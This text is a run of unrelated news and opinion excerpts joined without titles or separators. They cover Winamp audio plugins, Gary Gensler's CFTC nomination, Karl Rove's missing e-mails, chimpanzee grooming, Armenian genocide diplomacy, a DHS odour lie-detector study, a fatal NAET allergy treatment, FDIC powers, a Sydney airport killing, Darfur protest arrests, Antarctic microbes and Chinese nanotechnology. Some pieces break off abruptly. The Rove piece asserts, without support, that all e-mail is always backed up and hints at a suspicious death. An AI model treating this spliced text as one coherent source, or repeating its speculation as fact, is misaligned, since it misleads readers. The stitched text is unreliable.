That honor goes to an open source ( surprise ! surprise ! ) decoder called mpg123 .
It supports ReplayGain and 24 - bit output , both of which are lacking from the official decoder .
The difference in quality may not be that apparent on ordinary songs but this plugin really shines when the MP3 file contains a lot of detail .
To use this plugin , Just copy the file ‘ in_mpg123.dll ’ to ‘ C : \Program Files \Winamp \Plugins ’ and launch winamp .
Then under Preferences -> input , choose mpg123 and double click on it to set its properties .
Under Decoder tab , check ‘ Enable ’ and choose output format as ’ 16 bit ’ ( or ’ 24 bit ’ if your sound card supports it ) .
Under Replay Gain tab , check ‘ Enable ’ , choose ‘ Album gain ’ , and choose ‘ Hard Limiter ’ .
ReplayGain will make sure that all the songs play back at the same loudness , thus freeing you from changing the volume for different songs which had been mastered at different levels .
No changes are made by ReplayGain to the original MP3 file .
It just puts a tag on the file which is used by the decoder to decide whether to amplify or attenuate .
An alternative MP3 decoder called MAD also has a lot of following .
There is no conclusive evidence that it is better than mpg123 but arguments go on .
PS – The official mp3 encoder is also not the best one out there !
That honor goes ( again ) to an open source encoder called LAME .
Processing :
After a mp3 file gets decoded , it is fed to a Windows component called kmixer .
It does exactly what its name implies – it mixes all the audio streams being fed to it and sends them to the soundcard .
This is how we can hear those annoying Windows event sounds alongwith “ sweet home alabama ” .
If this were the only thing that kmixer was doing , it wo n’t be so bad except that the kmixer resamples everything , just to make it easier for it to mix all those audio streams .
It also fiddles with signal to noise ratio and does many other undesirable things .
The end result is that the audio stream comes out sounding very flat and dull .
So we need to find a way to bypass this mixer thing and send the audio stream directly to the soundcard .
Enter kernel streaming .
Download this plugin and just copy it to ‘ C : \Program Files \Winamp\Plugins ’.
Then choose ‘ kernel streaming ’ under Output preferences .
There are no settings for this plugin ( as yet ) .
Since it bypasses the kmixer , the winamp volume control wo n’t work with this plugin .
You have to use that little speaker icon in the task bar .
This is also way too loud at normal volumes , so keep the volume to a minimum when you try it for the first time .
In some cases , when you double click on a file after choosing kernel streaming , the winmap might quit .
This is normal .
Just relaunch the winamp and it should run fine from there on .
Output :
This section applies only if you have Creative soundcard or a soundcard based on 10K2 chipset .
After a mp3 files gets decoded by winamp , it gets fed to soundcard drivers .
These drivers make sense of this audio data and convert it to a format suitable for the soundcard to play .
But the drivers supplied by Creative are a bit crappy and bloated .
So head over to kxproject homepage and download these drivers .
These drivers have a cleaner sound ouput and are much more stable than the stock ones .
You also gain much more control over your soundcard settings .
Ears :
Finally , the most critical link in the sound quality chain – the ears .
If you cannot tell the difference between an MP3 file and the original CD it was encoded from , do n’t despair .
Most people can’t .
It takes time and practice and a really good audio setup to hone the listening skills .
I leave you here with some commentary from an audiophile who does not just hear music , but actually listens to it .
Be inspired !

Bernie Sanders , the senator from Vermont who is independent in spirit as well as party label , has placed a hold on President Obama ’s nomination of Gary Gensler to head the Commodity Futures Trading Commission .
Sounds like a minor issue to get worked up about , but the senator is right .
Like most Americans , I am eager for Barack Obama to succeed , but I see this appointment as further evidence that the president has entrusted his economic policy to the wrong people .
Gensler helped create this financial crisis when he was in the Treasury Department back in the Clinton era , when bipartisan cooperation with Wall Street lobbyists was all the rage .
Sanders gets right to the point : “ Mr. Gensler worked with Sen . Phil Gramm and Alan Greenspan to exempt credit default swaps from regulation , which led to the collapse of AIG and has resulted in the largest taxpayer bailout in U.S. history . ”
Sanders ’ hold will not stop the Gensler nomination , because Congress and the president , recognizing the nation ’s mood , want to give Wall Street whatever it wants to make the stock market go up .
And Gensler is a reassuring figure to the moguls of finance ; he was a partner at Goldman Sachs before being brought by Goldman honcho Robert Rubin to the Clinton Treasury Department .
After Rubin left to take a $ 20 - million - a - year job at Citigroup , which he helped run into the ground , Lawrence Summers , his protégé and replacement at Treasury , elevated Gensler to be an undersecretary .
Gensler then performed as Summers ’ point man in advocating for deregulation legislation that enabled the current debacle .
The explosion of toxic assets is a direct result of the laws pushed through by Rubin and his followers , and in the decade since , we have had a 20 - fold increase , to more than $ 530 trillion , in the value of those newfangled financial instruments , which Warren Buffett in February 2003 correctly termed “ financial weapons of mass destruction . ”
Yet when one member of the Clinton administration , Brooksley Born , then head of the Commodity Futures Trading Commission , attempted to sound a warning , she was treated by the rest of Clinton ’s economic team as the enemy .
In response to Born ’s warning , they drove her from government and pushed through the Commodity Futures Modernization Act , which summarily exempted from regulation the derivatives that now haunt us .
The claim at the time by Summers , now top economic adviser in the Obama White House , was that “ [ t ] his legislation promotes innovation and competition in the U.S. financial markets and may help to reduce systemic risk . ”
Of course now we know , as Born predicted , that it did quite the opposite .
What irony that Gensler is being rewarded with Born ’s old job for getting it wrong .
In congressional testimony supporting the radical deregulation of the financial derivatives market , Gensler had insisted with great enthusiasm that “ OTC derivatives directly and indirectly support higher investment and growth in living standards in the United States and around the world . ”
As to the many trillions of dollars in credit swaps that now afflict the world economy , Gensler specifically called for freeing swaps of this kind from existing government regulation in the Commodity Exchange Act , which regulated other futures such as wheat sales .
He said , “ … [ S ] wap transactions should not be regulated under the CEA . … ”
His key argument , and that of Summers as well , was that even raising the prospect of regulating what have proved to be toxic derivatives would deny these financial instruments the “ legal certainty ” they needed to thrive .
What a loss that would be , warned Summers , who called the financial derivatives market “ a powerful symbol of the kind of innovation and technology that has made the American financial system as strong as it is today . ”
So “ they ” — Summers , Gensler , Treasury Secretary Timothy Geithner and their über mentor , Rubin — were as wrong as anyone could be .
Perhaps such error is human , but are n’t there folks out there with a better prospect of getting it right that Obama can rely on ?
A great deal is at stake , and we are being asked to support the president ’s plans as a matter of trust in a hopeful new leader .
But the latest administration plan , announced by Geithner on Monday , seems to be more of the same .
We taxpayers are being asked to buy back from the banks the very toxic assets that the members of Obama ’s economic team once celebrated as an unmitigated blessing .
Only this time , instead of trusting the banks , we will turn over control , but little risk , to hedge funds that are totally unregulated .
Here we go again .
Evidence of Bush - Rove Crimes Hidden Away in Southern Town ?
by Glynn Wilson
CHATTANOOGA , Tenn . —
Hidden away in the basement of a bank building on Broad Street here , there is a bank of computer servers containing all the evidence Congress and the courts need to investigate and prosecute all the crimes of the Bush years .
That includes the mysteriously missing e-mail messages sent by Karl Rove from his White House office through the Republican National Committee e-mail addresses from his special Blackberry reserved for political activities .
Ethics rules prohibit political campaigning from the White House , but since that was Rove ’s sole job as political adviser to President Bush , what was an operative to do if he wanted to insist that a U.S. attorney be fired for not towing the Bush administration line by prosecuting Democrats ?
Rove , who has now defied a Congressional subpoena three times — a criminal act unprecedented in American history — is known to have used that Blackberry paid for by the RNC to keep on top of all kinds of nefarious activities , including the political prosecution of former Alabama Governor Don Siegelman .
Jeff Averbeck , the majority owner of Smartech and Airnet , has denied backing up Rove ’s e-mail that passed through his company ’s servers , but no news organization , grand jury , special prosecutor or Congressional investigator has asked the right followup questions to get to the bottom of one of the most critical mysteries of the Bush years .
The Chattanooga Times Free Press managed to get a local interview with Averbeck in 2007 about the allegedly missing 5,000 e-mail messages , but what he said makes no technological sense .
He told the paper ’s reporter that Smartech “ does not have access to RNC e-mail records and simply routes the e-mails through its servers . ”
But anyone who has ever built Web sites and hosted Web sites with e-mail addresses attached to domain names knows that all e-mail messages are digitally backed up .
Always .
Otherwise , what would happen when the servers inevitably go down in the event of a power failure or other computer glitch ?
Even CNN fell for the ruse of the missing e-mail , also reporting in April 2007 that “ millions of White House e-mails may be missing , ” although the source of that leak is never made clear .
The entire story appears to have been a trial balloon to set up a fake cover story for the massive destruction of critical evidence , but we are not buying it .
The electronic evidence could not have simply disappeared .
Even if someone tried to wipe the hard drives , there are back ups in other locations .
Somebody knows where this e-mail evidence is hidden , but no one seems to be actively going after it , except for Velvet Revolution , which is in the process of preparing a new subpoena for Averbeck in a civil lawsuit filed over election theft in Ohio .
Determined to get to the bottom of this story by first getting into the compound in Chattanooga that is still GOP Web central , the corporate offices of the company that handled all the Web and Internet work for the Republican National Convention in 2007 and George W. Bush ’s reelection campaign in 2004 as well as the e-mail traffic , I teamed up with videographer John Lee of PirateNews.org and headed over to 801 Broad Street .
When we got to the suite on the second floor that is listed as the company ’s address on its
Web site , we were greeted by a bank worker who said the company once occupied that space .
Now you have to go into the building ’s basement to find a high - tech doorway complete with security scanner .
When you ring the buzzer , it takes a few minutes for someone to answer the door .
We expected to be turned away , but amazingly we were allowed inside the compound .
We were led down two long hallways in the basement to a secret elevator deep inside the building , which took us up to the fifth floor .
We were led down another long hallway lined with Republican law offices and finally into the offices of Smartech - Airnet .
We got there just in time to witness a conference in progress by most of the high - powered Information Technology ( IT ) specialists in town , a group called the Chattanooga Technology Council .
We were greeted by a young man who identified himself only as Chris , who said he had only been with the company for a couple of weeks .
When we asked him if he could confirm our information from other sources that the company had backup copies of the e-mail , he said : “ I can not make any comments on that at all .
I would live in fear of saying the wrong thing . ”
Maybe there is a good reason for him to be careful with what he says .
One of the top technology gurus tied to the Bush family , Mike Connell , died in a mysterious plane crash back during the Christmas holidays of 2008 .

With most mammals , the biggest and most aggressive male claims the alpha male role and gets his choice of food and females .
But a new study from the University of Minnesota suggests that at least among chimpanzees , smaller , more mild - mannered males can also use political behavior to secure the top position .
The finding was gleaned from 10 years of observing dominant male chimpanzees in Gombe National Park , Tanzania , looking at behaviors they used to compete for alpha male status relative to their size .
Analysis showed that larger males relied more on physical attacks to dominate while smaller , gentler males groomed other chimpanzees , both male and female , to gain broad support .
The study focused on three alpha males who reigned between 1989 and 2003 .
Frodo , one of the largest and most aggressive male chimpanzees ever observed at Gombe , weighed 51.2 kg ( 112.6 lbs. ) at his peak .
He relied on his size and aggression to rule .
While he allowed other chimpanzees to groom him , he seldom returned the favor .
At the other end of the spectrum , Wilkie , who weighed only 37 kg ( 81.4 lbs. ) , obsessively groomed both male and female chimpanzees to maintain his top position .
And Freud , who weighed 44.8 kg ( 98.6 lbs. ) , used a combination of the two strategies .
( The average male chimp in Gombe weighs about 39 kg ( 85.8 lbs . ) .
The findings are reported in the February issue of the American Journal of Primatology .
While it 's widely known that grooming plays an important role in chimpanzee social interaction , this study is the first to show that it can be a strategy for achieving dominance .
Mark Foster , who was an undergraduate pursuing a bachelor of arts degree in anthropology and a B.F.A. in acting when the research was conducted , was the study 's lead author of the study .
As a recipient of a Katherine E. Sullivan Fellowship he later spent six months in Tanzania and Gombe and then became an educational assistant at the Lincoln Park Zoo in Chicago .
" Mark showed extraordinary creativity and tenacity in pulling together this study while still an undergraduate and then seeing it through to publication , " said Anne Pusey , who was senior author .
Pusey is director of the Jane Goodall Institute 's Center for Primate Studies at the University of Minnesota and a University McKnight Distinguished Professor in the College of Biological Sciences ' department of ecology , evolution and behavior ( EEB ) .
Other collaborators included EEB graduate students Ian Gilby , who guided Foster in the initial outline of the question and in data extraction ; Carson Murray , who guided data analysis ; and Emily Wroblewski , who analyzed data on male dominance hierarchies .
Statistics graduate student Alicia Johnson of the U of M Statistics Clinic guided the statistical analysis .
Gilby is now a post - doctoral fellow at Harvard , and Murray a post - doctoral fellow at Lincoln Park Zoo .
" We were aware that Frodo was a bully and a stingy groomer , but we did not know how closely grooming patterns would correlate with body size , " Pusey said .
" We plan to study more alpha males to determine if grooming is a common strategy that small - bodied males use to placate rivals or cultivate cooperative alliances . "
The Jane Goodall Institute 's Center for Primate Studies was established in 1995 at the College of Biological Sciences by Pusey , a former student of Goodall's .
Pusey brought all of Goodall 's field notes and photographs from 48 years in Gombe to the University of Minnesota .
She is overseeing the creation of a searchable , online database providing access to Goodall 's research material .

Wednesday 28 , March 2007ArmeniaLibertyBy Emil DanielyanTurkish Foreign Minister Abdullah Gul reiterated on Wednesday his government ’s calls for the creation of a commission of Turkish and Armenian historians who would jointly examine the mass killings and deportations of Armenians in the Ottoman Empire .
The move appeared to be part of Turkey ’s ongoing efforts to scuttle the passage of a U.S. congressional resolution recognizing the 1915 - 1918 slaughter of more than one million Ottoman Armenians as genocide .
Writing in “ The Washington Times , ” Gul warned that the resolution ’s approval by the U.S. Congress would jeopardize Turkish - American “ strategic partnership ” and would be “ deeply offensive to the Turkish people . ”
Still , he stopped short of explicitly denying that the Armenian massacres constituted a genocide , describing them as a “ tragedy ” that requires deeper academic research .
“ With regard to the Armenian allegation describing the tragedy that befell them as genocide , the question , from the point of view of international law , is whether the Ottoman government systematically pursued a calculated act of state policy for their destruction in whole or in part , ” Gul wrote .
“ The answer to this question can only be established by scholars who have the ability to evaluate the period objectively , working with the full range of available primary sources . ”
“ Hence , Turkey made a proposal to Armenia in 2005 to establish a joint commission of historians to find out once and for all what really happened , and how it took place , ” he said , adding that Ankara is still “ eagerly awaiting ” Yerevan ’s positive response to the offer .
In his written response to Turkish Prime Minister Recep Tayyip Erdogan , President Robert Kocharian effectively rejected the idea and suggested that this and other contentious issues be tackled by a Turkish - Armenian intergovernmental commission .
Armenia ’s government and Diaspora argue that the Armenian genocide is a fact recognized by many international historians .
They regard the Turkish offer as a ploy design to stop a growing number of countries from affirming the genocide .
The offer appears to have marked a major change in the Turkish state ’s position on the highly sensitive subject .
Successive Turkish governments have for decades asserted that Ottoman Armenians died in smaller numbers and were not victims of a premeditated genocidal policy .
They have also claimed that Armenians themselves massacred hundreds of thousands of Ottoman Turks .
Gul and other Turkish officials now say they are ready to accept any conclusion to be drawn by the would - be commission of historians .
In his article , Gul said the Erdogan government would also welcome involvement of scholars from the United States and other countries in the proposed research .
“ The establishment of such a commission will also help shape an atmosphere conducive to the normalization of Turkish - Armenian relations , ” he added .
A group of prominent Armenians and Turks already initiated a third - party study of the events of 1915 - 1918 when they jointly approached the International Center for Transitional Justice ( ICTJ ) in 2002 .
In a detailed report , the New York - based organization concluded that the Armenian massacres “ include all of the elements of the crime of genocide ” as defined by a 1948 United Nations convention .
U.S. President George W. Bush has repeatedly cited the ICTJ study in his annual April 24 messages to the Armenian - American community .
The most recent of Bush ’s statements called it “ a significant contribution toward deepening our understanding of these events .

You ’ve heard of the polygraph .
Now the US Government is seeking to develop a “ smellograph . ” UPI Homeland and National Security Editor Shaun Waterman reports that the Department of Homeland Security is funding a “ proof of concept ” study into whether odors emitted by the human body can be used to determine whether a person is lying :
DHS wants to use human body odor as biometric identifier , clue to deception
Published : March 9 , 2009 at 3:35 PM
By SHAUN WATERMAN
UPI Homeland and National Security Editor WASHINGTON , March 9 ( UPI ) —
The U.S. Department of Homeland Security plans to study the possibility that human body odor could be used to tell when people are lying or to identify individuals in the same way that fingerprints can .
In a federal procurement document posted Friday on the Web , the department ’s Science and Technology Directorate said it would conduct an “ outsourced , proof - of - principle study to determine if human odor signatures can serve as an indicator of deception . …
As a secondary goal , this study will examine … human odor samples for evidence to support the theory that an individual can be identified by that individual ’s odor signature . ”
The procurement announcement , titled “ Human Odor as a Biometric for Deception ” is available here .
It should be noted that while they did n’t sniff for liars , the East German secret police had similar ideas about identifying people by their odor and maintained a vast “ smell register ” of glass tubes with cloth swatches storing for future reference the “ odor signatures ” of dissidents .
The scheme did n’t work particularly well .
Do we really want DHS to be emulating the Stasi ?
Officials said that the work was at a very early stage , but the announcement brought criticism from civil liberties advocates who said it showed the department ’s priorities were misplaced .
The procurement notice said the department is already “ conducting experiments in deceptive behavior and collecting human odor samples ” and that the research it hopes to fund “ will consist primarily of the analysis and study of the human odor samples collected to determine if a deception indicator can be found . ”
“ This research has the potential for enhancing our ability to detect individuals with harmful intent , ” the notice said .
“ A positive result from this proof - of - principle study would provide evidence that human odor is a useful indicator for certain human behaviors and , in addition , that it may be used as a biometric identifier . ”
DHS spokeswoman Amy Kudwa told United Press International that “ proof of concept ” work was the very earliest stage of technological development .
The directorate “ is trying to determine what factors of human behavior and chemistry can provide clues to the intent to deceive , ” she said , adding that the work would be carried out by the Federally Funded Research and Development Center run by the non-profit Mitre Corp. , which conducts cutting - edge research for U.S. military , homeland security and intelligence agencies .
Barry Steinhardt , director of the ACLU ’s technology and liberty project , told UPI that the plan showed the department had “ misplaced priorities . ”
“ The history of DHS ’ deployment of these technologies has been one colossal failure after another , ” he said .
“ There is no lie detector .
This research has been a long , meandering journey , which has taken us down one blind alley after another . ”
Steinhardt added that even well - established biometric - identity technologies like fingerprinting have resulted in individuals being inaccurately identified , like Oregon lawyer Brandon Mayfield , who got an apology from the FBI after being wrongfully accused of having had a hand in the 2004 Madrid rail bombings .
“ None of the biometrics for identity have worked very well , with the possible exception of DNA , ” he said , adding that even fingerprint evidence was “ increasingly being challenged in courts around the country . ”
“ This shows the misplaced priorities ( of DHS ) , ” he said .
“ The government does n’t need to take us down another blind alley . ”
Steinhardt is right , and given the current financial crisis , this technological flight of fancy should get the budgetary axe .
Recent scientific research shows that so - called volatile organic compounds present in human sweat , saliva and urine can be analyzed using a technique known as gas chromatography - mass spectrometry .
Research published by the Royal Society in London in 2006 found “ a substantial number of marker compounds ( in human sweat ) that can potentially differentiate individuals or groups . ”
Researchers took five samples each from 179 individuals over a 10 - week period and analyzed them , finding hundreds of chemical markers that remained more or less constant for each individual over time .
An analysis of these compounds “ found strong evidence for individual ( odor ) fingerprints , ” the researchers concluded .
However , they warned that some individuals appear to have less distinctive odors than others , adding that “ the reason for the variation in distinctiveness is unclear . ”
More importantly , some individuals ’ odors changed during the course of the study .
“ Not all subjects had consistent marker compounds over time , which might be due to physiological , dietary or other changes , ” the researchers concluded .
The researchers also cautioned that some of these marker compounds might be “ exogenous chemical contaminants ” from skin-care or perfume products or tobacco smoke and other substances present in an individual ’s environment .
About a quarter of the 44 apparently distinctive marker compounds they were able to analyze appeared to be artificial contaminants , the researchers said .
“ Determining the origins of individual and sex-specific odors — and controlling exogenous chemical contaminants — may provide the most important challenge for future … studies , ” the researchers said .
Those challenges are likely to be significant , and they will multiply if the techniques are deployed in the field .
“ While some of these sensors perform well in the lab , the real world may be different , ” technology consultant and author John Vacca said .
“ The technology is still in its infancy . ”
AntiPolygraph.org ’s George Maschke has prepared the following video commentary regarding DHS ’s plans for a smell - based lie detector :
A man who suffered from a peanut allergy collapsed and died from severe anaphylactic shock less than an hour after receiving treatment for his allergy from an alternative medicine practitioner .
Dublin Coroner 's Court yesterday heard that Thomas Schatten ( 43 ) , of Marina Village , Malahide , Co Dublin , collapsed and died in the living room of his home on the evening of May 18 , 2005 .
He had earlier been treated for the peanut allergy by kinesiologist Dr Brett Stevens , who told the inquest that Mr Schatten ate a small bit of peanut during his appointment , to which he had no reaction .
The allergy elimination technique used by Dr Stevens , who is also a chiropractor , is called NAET and involves " muscle testing " .
The inquest heard that Mr Schatten , an editor and writer , had received the treatment on four previous occasions for his peanut allergy and suffered no ill effects .
Following the treatment , Mr Schatten , who had experienced two anaphylactic reactions in the past , went to the bathroom and Dr Stevens , upon hearing coughing coming from the toilet , asked Mr Schatten if he was all right .
Mr Schatten , who suffered from asthma , said he had a bit of a cough and that his chest was tight and indicated he wanted to go home to get his medication for asthma .
Reaction
He left the clinic at 5.20 pm .
Dr Stevens told the court he did n't think Mr Schatten was having an anaphylactic reaction .
He said he was aware that he had suffered a reaction to peanuts when he was young and avoided them prior to beginning the treatment .
About 15 minutes later , Dr Stevens rang Mr Schatten to make sure he was all right .
Mr Schatten could only say the words " breathing " and " ambulance " .
After arranging for an ambulance to be called , Dr Stevens made his way to Mr Schatten 's apartment .
He found him lying on the ground with laboured breathing .
He suffered a cardiac arrest on the way to Beaumont Hospital and was pronounced dead at 6.55 pm .
A post mortem found he had died of an acute hypersensitivity reaction or anaphylactic reaction to peanut .
Supervision
Professor of histopathology at the Royal College of Surgeons and at Beaumont Hospital , Mary Leader , told the inquest that in ( allopathic ) medicine such desensitisation would not be carried out without strict supervision in a hospital where drugs , IV access , oxygen and a doctor were immediately available and she said no person should be tested for nut allergy without these .
" If a patient has an acute anaphylactic reaction like this they are immediately treated with drugs to stop the reaction , " she said .
She said the coughing and tightening of chest Mr Schatten experienced are symptoms associated with an allergic response .
The court heard there was an approximate 35 - minute time lapse between the ambulance being called and arriving , due to a shortage of ambulances .
There were no suspicious circumstances , Garda Shay McGrath said .
He said he believed the death was accidental and Dr Stevens was attempting to alleviate the allergy using the methods he used .
A file went to the DPP in relation to the death .
Coroner Brian Farrell recorded a verdict of death by misadventure and called for the re-evaluation of the NAET allergy elimination technique in relation to peanut allergies .

Ca n't Even Afford a Crisis Berlin's Poverty Protects
It from Downturn
Recession ?
What recession ?
From Berlin , it 's been hard to tell that there is a global economic downturn .
A lack of industry and years of high unemployment mean that Germany 's capital can't sink much further .

The chairwoman of the Federal Deposit Insurance Corporation , Sheila C. Bair , said in a speech on Monday that her agency should have broader powers to take over and close a variety of financial institutions to prevent taxpayers from shouldering the losses on firms deemed too big to fail .
Instead of just seizing commercial banks , Ms. Bair said the F.D.I.C. should be able to take over troubled insurers , bank holding companies and other insolvent financial institutions and force stockholders and bondholders to bear the cost .
“ Viable portions of the company would be put into the good bank , while the ailing portions would remain at the bad bank to be sold or closed over time , ” Ms. Bair said at a speech at the Economic Club of New York .
So far , the federal government has committed to spend $ 12.8 trillion  which includes the bailouts of the insurance giant American International Group and the mortgage finance companies Fannie Mae and Freddie Mac  to resolve the credit crisis .
As part of that , more than $ 90 billion has been spent to shore up Citigroup and Bank of America .
A 29 - year - old man has been bludgeoned to death in broad daylight at Sydney Airport in a brawl that police believe involved up to 15 outlaw bikies from possibly two gangs .
The man was treated at the scene after being hit with a portable metal bollard but was pronounced dead at Prince of Wales Hospital .
The bollard , among a number of other items , has been taken for forensic examination .
Five crime scenes have been established - one at the hospital and several at the airport .
Police said a group of men arrived on a flight to Sydney about 1.30 pm on Sunday and were unexpectedly met by another group of men , possibly a rival outlaw bikie group .
" A fight ensued [ and ] moved through various parts of the terminal , " Detective Inspector Peter Williams said .
He said it " appeared that a certain degree of planning went into it " .
Police will review CCTV footage and have begun speaking to between 30 and 50 witnesses , many of whom Detective Inspector Williams described as " traumatised " .
Police have four men in custody who are assisting them with inquiries .
Sydney Airport said the matter was now with police so they were unable to comment .
MSNBC is reporting that five congressional representatives have been arrested outside the Sudanese Embassy after headling a Darfur protest .
Those arrested were : Donna Edwards ( D - MD ) , James McGovern ( D - MA ) , Lynn Woolsey ( D - CA ) , Keith Ellison ( D - MN ) and John Lewis ( D - GA ) .
They were bound with zip - tie handcuffs and driven away in a large white van .
Update : From the Washington Post :
Eight activists protesting the expulsion of aid groups in Darfur have been arrested in front of the Sudanese Embassy in Washington .
Humanitarian leaders and U.S. lawmakers , including Minnesota Rep. Keith Ellison and Maryland Rep. Donna Edwards , were led away from the embassy in handcuffs Monday after crossing a police line .
The activists are urging world leaders to take a stand against Sudanese President Omar al - Bashir 's decision to expel 16 aid agencies from Darfur .
Ellison says it is wrong to deny aid to what he calls " the most vulnerable people on our planet . "
The United Nations says up to 300,000 people have died in Darfur , where ethnic African rebel groups have been fighting the Arab - dominated national government for six years .
A reservoir of briny liquid buried deep beneath an Antarctic glacier supports hardy microbes that have lived in isolation for millions of years , researchers report April 17 in the journal Science .
The discovery of life in a place where cold , darkness , and lack of oxygen would previously have led scientists to believe nothing could survive comes from a team led by researchers at Harvard University and Dartmouth College .
Their work was funded by the National Science Foundation , NASA , and Harvard 's Microbial Sciences Initiative .
Despite their profound isolation , the microbes are remarkably similar to species found in modern marine environments , suggesting that the organisms now under the glacier are the remnants of a larger population that once occupied an open fjord or sea .
" It 's a bit like finding a forest that nobody has seen for 1.5 million years , " says Ann Pearson , Thomas D. Cabot Associate Professor of Earth and Planetary Sciences in Harvard 's Faculty of Arts and Sciences .
" Intriguingly , the species living there are similar to contemporary organisms , and yet quite different -- a result , no doubt , of having lived in such an inhospitable environment for so long . "
" This briny pond is a unique sort of time capsule from a period in Earth 's history , " says lead author Jill Mikucki , now a research associate in the Department of Earth Sciences at Dartmouth and visiting fellow at Dartmouth 's Dickey Center for International Understanding and its Institute of Arctic Studies .
" I do n't know of any other environment quite like this on Earth . "
Chemical analysis of effluent from the inaccessible subglacial pool suggests that its inhabitants have eked out a living by breathing iron leached from bedrock with the help of a sulfur catalyst .
Lacking any light to support photosynthesis , the microbes have presumably survived by feeding on the organic matter trapped with them when the massive Taylor Glacier sealed off their habitat an estimated 1.5 to 2 million years ago .

Mikucki , Pearson , and colleagues based their analysis on samples taken at Antarctica 's Blood Falls , a frozen waterfall - like feature at the edge of the Taylor Glacier whose striking red appearance first drew early explorers ' attention in 1911 .
Those " Heroic Age " adventurers speculated that red algae might have been responsible for the bright color , but scientists later confirmed that the coloration was due to rust , which the new research shows was likely liberated from subglacial bedrock by microorganisms .
Because water flows unpredictably from below the glacier at Blood Falls , it took Mikucki a number of years to obtain the samples needed to conduct an analysis .
Finally , in the right place at the right time , she was able to capture some of the subglacial brine as it flowed out of a crack in the glacial wall , obtaining a sample of an extremely salty , cold , and clear liquid for analysis .
" When I started running the chemical analysis on it , there was no oxygen , " she says .
" That was when this got really interesting .
It was a real ' Eureka ! ' moment . "
The fluid is rich in sulfur , a geochemical signature of marine environments , reinforcing suspicions that the ancestors of the microbes now beneath the Taylor Glacier probably lived in an ocean long ago .
When sea level fell more than 1.5 million years ago , they hypothesize , a pool of seawater was likely trapped and eventually capped by the advancing glacier .
The exact size of the subglacial pool remains a mystery , but it is thought to rest under 400 meters of ice some four kilometers from its tiny outlet at Blood Falls .
Mikucki's analysis showed that the sulfur below the glacier had been uniquely reworked by microbes and provides insight into how these organisms have been able to survive in isolation for so long .
The research answers some questions while raising others about the persistence of life in such extreme environments .
Life below the Taylor Glacier may help address questions about " Snowball Earth , " the period of geological time when large ice sheets covered Earth 's surface .
But it could also be a rich laboratory for studying life in other hostile environments , and perhaps even on Mars and or Jupiter 's ice - covered moon , Europa .
Mikucki and Pearson 's co-authors are David T. Johnston and Daniel P. Schrag at Harvard , Alexandra V. Turchyn at the University of Cambridge , James Farquhar at the University of Maryland , Ariel D. Anbar at Arizona State University , John C. Priscu at Montana State University , and Peter A. Lee at the College of Charleston .
Seated inside one of China 's most advanced science laboratories , two PhD students dressed from head to toe in protective white suits listen intently to Mariah Carey 's pop classic Hero .
It is not the song , but the millimetre - thin , transparent strip making the sound that captures their attention - a nano - speaker they hope will revolutionise where , and how , we listen to music .
" This is cutting edge , " says Professor Shoushan Fan , director of the nanotechnology lab at Beijing 's prestigious Tsinghua University .
Without a cone , magnet or amplifier , the speaker , which looks little more than a slim film of see - through plastic , can be used to transform almost any surface into an auditorium .
It is made from nanocarbon tubes which , when heated , make the air around them vibrate , producing the sound .
" The speaker 's bendy and flexible , " says Fan .
" You could stick it to the back window of your car and play music from there . "
Mega investment
Fan 's nano - speaker is just the tip of the iceberg in China 's sweeping nanotech programme , which has the potential to transform its export - based economy and nearly every aspect of our lives , from food and clothes to medicine and the military .
Nanotechnology - the manipulation of matter on an atomic scale to develop new materials - is an industry predicted to be worth nearly £ 1.5tn pounds by 2012 , and China is determined to corner the biggest chunk of the market .
Its investment has already surpassed that of any other country after the US .
Since 1999 , China 's spending on research and development ( R&D ) has gone up by more than 20 % each year .
A further boost will come from the £ 400bn economic stimulus package announced by the Chinese government this year , £ 12bn of which has been ringfenced for R&D .
Tiny superpower
" The overall trends are irrefutable , " says Dr James Wilsdon , director of the Science Policy Centre at the Royal Society , and author of the Demos report " China : The Next Science Superpower ? " .
" China is snapping at the heels of the most developed nations , in terms of research and investment , in terms of active scientists in the field , in terms of publications and in terms of patents . "
Fan hopes the economic crisis , which has led to thousands of Chinese factories closing , will force the country to move from the manufacture of low - end products such as toys and trainers to more hi-tech goods such as nano - touchscreens for mobile phones .
His team is working on a material to replace the indium tin oxide ( ITO ) used in the kind of touch panels found on BlackBerrys and iPhones .
" ITO is very expensive and breaks if bent , " he says .
" We 're developing thin nanotube films to replace ITO .
It can bend and it's much cheaper . "
China now produces more papers on nanotech than any other nation .
Nanotech plants have sprung up in cities from Beijing in the north to Shenzhen in the south , working on products including exhaust - absorbing tarmac and carbon nanotube - coated clothes that can monitor health .
Last month , researchers from Nanjing University and colleagues from New York University unveiled a two - armed nanorobot that can alter genetic code .
It enables the creation of new DNA structures , and could be turned into a factory for assembling the building blocks of new materials .
" There 's no end of areas in which nanotech is already being used , " says Wilsdon .
" It 's the product of targeted investment for the development and refinement of novel nanomaterials .
And the reason the Chinese focus on that area is because it 's closer to the market . "
Small - scale war
China , like the US , is also assumed to be focusing much of its R&D investment on military applications .
" There 's a lot of concern about the use of nanotech with weapons , " says Wilsdon .
" I 'm sure China is spending significant amounts of their R&D budget on military uses . "
Tim Harper , founder of the nanotech consultancy Cientifica Ltd , says carbon nanotube composites could be used to strengthen armour , that non-scratch nano - coatings are being developed for cockpits and researchers are trying to find a nano replacement for military - use batteries .
" The US is working on all of these things , so I 'm sure the Chinese are doing much the same , " he says .
Underlying these developments are serious safety concerns .
Nanoparticles are so small they are easily inhaled and absorbed through the skin .
Dr Andrew Maynard , the chief science advisor to the Project on Emerging Nanotechnologies at the Woodrow Wilson International Center for Scholars in Washington , says that some nanoparticles could be deadly .
" Nothing has yet been confirmed , but there are strong suggestions that inhaling these particles could cause lung cancer or lung disease , " he says .
" If carbon nanotubes behave anything like asbestos , we wo n't know what the health impacts are for about 20 years , because that 's how long it can take from exposure to the onset of the disease . "
Most experts agree that a system of stringent safety regulations and comprehensive quality inspection checks is needed before China 's nano - coatings , cosmetics and clothes are stocked by supermarkets .
" The economic crisis could prove the catalyst that Chinese nanotech companies need to get this system in place , " says Harper .
Under the microscope
The global nanotechnology market could top $ 2tn by 2012 , predicts Tim Harper , founder of the nanotech consultancy CMP Cientifica .
" What we see is a big take - off in 2011 , and by 2012 the industry is really going to be booming , " he says .
" We 've been pumping hundreds of millions of dollars into the nanotech industry for the last decade and we 're finally getting to the point where we 're seeing products being manufactured and sold . "
Harper predicts that by 2010 , areas of nanotechnology and biology will have merged , setting in motion the production of a wealth of new drugs and clinical equipment ( such as the vials of nanomaterials for use in health products , clothes and cosmetics ) .
